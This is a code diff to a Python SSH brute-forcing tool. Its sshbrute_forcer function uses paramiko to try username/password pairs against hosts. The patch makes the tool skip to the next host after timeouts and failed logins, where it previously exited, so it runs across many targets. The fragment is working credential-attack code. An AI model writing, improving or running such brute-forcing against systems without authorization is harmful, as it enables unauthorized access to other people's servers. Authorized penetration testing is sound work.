@@ -125,16 +125,17 @@ def main():
 
     def sshbrute_forcer(host, username, password):
         """Function to brute force SSH"""
-        port='22' # port ssh.
+        port='22'  # port ssh
         ssh=paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
             ssh.connect(hostname=host, username=username, password=password, timeout=3)
         except socket.timeout:
-            print(f"\n{error}{red}Not found {host} or timeout connection. {host}\n")
-            sys.exit(1)
+            print(f"\n{error}{red}Not found {host} or timeout connection. Skipping to next host.\n")
+            return False  # Skip to next host
         except paramiko.AuthenticationException:
             print(f'{error}[ATTEMPT] host {host} - login "{username}" - pass "{password}"')
+            return False
         except paramiko.SSHException as e:
             if 'Error reading SSH protocol banner' in str(e):
                 print(f"{error}Error reading SSH protocol banner from {host}. Skipping to next host.")
@@ -171,7 +172,7 @@ def main():
 
                 if sshbrute_forcer(host, username, password):
                     break
-                
+
                 attempt_count += 1
 
             if attempt_count >= 9:
